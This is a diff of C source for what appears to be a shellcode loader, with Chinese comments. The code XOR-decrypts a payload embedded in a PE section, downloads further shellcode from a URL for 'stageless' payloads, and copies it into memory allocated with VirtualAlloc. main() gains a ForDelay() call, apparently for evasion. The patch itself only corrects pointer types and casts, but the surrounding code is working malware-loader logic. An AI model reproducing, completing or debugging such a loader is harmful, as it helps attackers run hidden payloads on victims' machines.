@@ -300,7 +300,7 @@ int DecryptSC(struct ConfigurationData* config,unsigned char *encData,unsigned i
 	if (encData[0] == H_ENC_XOR)
 	{
 		config->shellcodeSize = *(unsigned int*)(encData + 1 + 16);
-		config->shellcode = malloc(config->shellcodeSize);
+		config->shellcode = (unsigned char*)malloc(config->shellcodeSize);
 		for (int i = 0; i < config->shellcodeSize; i++)
 		{
 			(encData + 1 + 16 + 4)[i] ^= (encData + 1)[i % 0x10];
@@ -342,11 +342,11 @@ int RunSCFromPE(struct ConfigurationData* config)
 	//解析PE结构，从区段获取SC
 	GetSCPointerFromPE(config, &encData, &encDataSize);
 	//解密SC
-	if (DecryptSC(config, (unsigned char*)encData, &encDataSize)==0)
+	if (DecryptSC(config, (unsigned char*)encData, encDataSize)==0)
 	{
 		if (config->shellcode[0] == P_TYPE_STAGE)
 		{
-			unsigned int dwBaseAddr = VirtualAlloc(0, config->shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+			LPVOID dwBaseAddr = VirtualAlloc(0, config->shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 			if (dwBaseAddr)
 			{
 				//去掉头部
@@ -368,15 +368,15 @@ int RunSCFromPE(struct ConfigurationData* config)
 		else if (config->shellcode[0] == P_TYPE_STAGELESSURL)
 		{
 			unsigned int urllen = *(unsigned int*)(config->shellcode + 1);
-			unsigned char* url = malloc(urllen + 1);
+			unsigned char* url = (unsigned char*)malloc(urllen + 1);
 			if (url)
 			{
 				//解析url
 				memset(url, 0, urllen + 1);
 				memcpy(url, config->shellcode + 1 + 4, urllen);
-				GetStageless(url, &config->shellcode, &config->shellcodeSize);
+				GetStageless(url, &config->shellcode, (unsigned int *)&(config->shellcodeSize));
 				free(url);
-				unsigned int dwBaseAddr = VirtualAlloc(0, config->shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+				LPVOID dwBaseAddr = VirtualAlloc(0, config->shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 				if (dwBaseAddr)
 				{
 					memcpy(dwBaseAddr, config->shellcode, config->shellcodeSize);
@@ -396,6 +396,8 @@ int RunSCFromPE(struct ConfigurationData* config)
 
 int main()
 {
+	ForDelay();
+
 	ForBD();
 	
 	struct ConfigurationData config;
